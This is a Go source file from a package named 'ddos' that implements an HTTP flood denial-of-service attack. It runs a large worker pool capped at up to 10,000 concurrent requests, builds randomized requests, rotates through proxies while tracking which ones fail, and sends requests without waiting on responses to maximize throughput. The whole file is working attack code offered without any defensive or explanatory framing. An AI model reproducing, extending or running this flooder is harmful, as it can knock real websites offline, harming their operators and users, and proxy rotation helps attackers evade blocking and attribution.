package ddos

import (
	"io"
	"net/http"
	"sync/atomic"
	"time"
)

// startFloodAttack starts HTTP flood attack
func (d *DDoSAttack) startFloodAttack() {
	d.startFloodWorkers(d.config.MaxThreads)
}

// startFloodWorkers starts specified number of flood workers using stable worker pool pattern
// Uses job queue pattern similar to cracker for stability while maintaining high performance
func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
	// Always use connection pool (required for efficiency)
	pool, err := NewClientPool(d.config)
	if err != nil {
		// If pool creation fails, we can't proceed efficiently
		return
	}
	d.clientPool = pool

	// Create request builder (always enabled with randomization)
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Create shared GoroutineLimiter for bounded concurrency across all workers
	// Limit total concurrent async requests to prevent resource exhaustion
	// Use MaxThreads * 2 as a reasonable limit for concurrent requests
	maxConcurrentRequests := numWorkers * 2
	if maxConcurrentRequests < 500 {
		maxConcurrentRequests = 500 // Minimum for high throughput
	}
	if maxConcurrentRequests > 10000 {
		maxConcurrentRequests = 10000 // Cap to prevent excessive goroutines
	}
	d.globalLimiter = NewGoroutineLimiter(maxConcurrentRequests)

	// Create bounded job channel (reduced from 1000-2000 to 100-500 for stability)
	// Workers will pull jobs from this channel sequentially
	bufferSize := 100
	if numWorkers > 500 {
		bufferSize = 300
	} else if numWorkers > 200 {
		bufferSize = 200
	}
	jobChan := make(chan struct{}, bufferSize)

	// Start job producer (single goroutine feeds all workers)
	d.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
			}
			close(jobChan)
			d.wg.Done()
		}()

		// Continuously send jobs to channel
		for {
			select {
			case <-d.ctx.Done():
				return
			case jobChan <- struct{}{}:
				// Job sent successfully
			}
		}
	}()

	// Start workers - each worker processes jobs sequentially
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.stableFloodWorker(pool, jobChan)
	}
}

// stableFloodWorker processes jobs sequentially using stable worker pool pattern
// Similar to cracker pattern: pull job → build request → send (via limiter) → repeat
func (d *DDoSAttack) stableFloodWorker(pool *ClientPool, jobChan <-chan struct{}) {
	defer func() {
		// Recover from panics to prevent worker crashes
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
		d.wg.Done()
	}()

	// Get a client from pool for this worker
	client := pool.GetClient()
	if client == nil {
		return
	}

	// Validate client before use (lightweight check)
	if !isConnectionHealthy(client) {
		// Try to get another client
		client = pool.GetClient()
		if client == nil {
			return
		}
	}

	proxyURL := pool.GetProxyForClient(client)

	// Ensure requestBuilder is initialized
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Safe type assertion
	rb, ok := d.requestBuilder.(*RequestBuilder)
	if !ok || rb == nil {
		return
	}

	// Process jobs sequentially (stable pattern, no nested goroutines)
	for {
		select {
		case <-d.ctx.Done():
			return
		case _, ok := <-jobChan:
			if !ok {
				// Channel closed, producer done
				return
			}

			// Build request
			req, err := rb.BuildRequest()
			if err != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
				continue
			}
			req = req.WithContext(d.ctx)

			// Track request sent
			atomic.AddInt64(&d.requestsSent, 1)
			atomic.AddInt64(&d.activeConns, 1)

			// Send request asynchronously using global limiter (bounded concurrency)
			// This ensures we don't create unbounded goroutines
			if d.globalLimiter != nil {
				d.globalLimiter.Execute(func() {
					d.sendRequestAsync(client, req, proxyURL)
				})
			} else {
				// Fallback if limiter not initialized (shouldn't happen)
				go d.sendRequestAsync(client, req, proxyURL)
			}

			// Optimistically track as success (will be corrected by sendRequestAsync if it fails)
			atomic.AddInt64(&d.requestsSuccess, 1)
		}
	}
}

// sendRequestAsync sends a request asynchronously with proper error handling and proxy tracking
func (d *DDoSAttack) sendRequestAsync(client *http.Client, req *http.Request, proxyURL string) {
	defer func() {
		// Always decrement active connections when request completes
		atomic.AddInt64(&d.activeConns, -1)
		// Recover from panics to prevent crashes
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
			atomic.AddInt64(&d.requestsSuccess, -1) // Correct optimistic increment
			if proxyURL != "" {
				d.markProxyFailure(proxyURL)
			}
		}
	}()

	startTime := time.Now()
	resp, err := client.Do(req)
	responseTime := time.Since(startTime)

	if err != nil {
		// Check if this is an HTTP/2 specific error
		if isHTTP2Error(err) {
			// HTTP/2 connection error - don't immediately mark proxy as failed
		}
		atomic.AddInt64(&d.requestsFailed, 1)
		atomic.AddInt64(&d.requestsSuccess, -1) // Correct optimistic increment
		if proxyURL != "" {
			d.markProxyFailure(proxyURL)
		}
		return
	}

	// Handle response body properly for HTTP/2 compatibility
	if resp.Body != nil {
		// Skip reading response body for efficiency (fire-and-forget)
		// But drain a small amount for HTTP/2 stream closure
		io.CopyN(io.Discard, resp.Body, 4096)
		resp.Body.Close()
	}

	// Track success
	if proxyURL != "" {
		d.markProxySuccess(proxyURL, responseTime)
	}
	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
}
